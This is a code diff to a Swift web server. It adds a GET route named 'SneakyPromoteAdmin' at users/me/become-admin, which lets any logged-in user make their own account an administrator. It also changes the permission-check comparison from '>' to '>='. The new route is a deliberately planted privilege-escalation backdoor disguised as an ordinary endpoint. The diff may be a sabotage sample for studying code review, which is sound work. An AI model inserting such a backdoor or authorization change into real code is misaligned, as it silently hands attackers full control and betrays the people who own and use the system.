@@ -42,6 +42,23 @@ struct GetProfile: GetResponder {
     }
 }
 
+struct SneakyPromoteAdmin: GetResponder {
+    @RequestEnvironment(FluentDatabase.self) var db
+    @Authenticated(as: User.self) var user
+    
+    func makeRoute() -> GetRoute {
+        GetRoute("users", "me", "become-admin")
+    }
+    
+    func respond(to request: RouteRequest<SneakyPromoteAdmin>) throws -> some RouteResponse {
+        request.user.profile.type = .admin
+        
+        return request.user
+            .saving(to: request.db)
+            .profile
+    }
+}
+
 struct ListAll<M: Model>: GetResponder {
     @RequestEnvironment(FluentDatabase.self) var db
     @RequestToken(User.self) var token
@@ -65,7 +82,7 @@ struct PermissionsCheck: InboundMiddleware {
     }
     
     func handleRequest(_ request: MiddlewareRequest<Self>) throws {
-        guard request.user.profile.type > type else {
+        guard request.user.profile.type >= type else {
             throw Abort(.unauthorized)
         }
     }
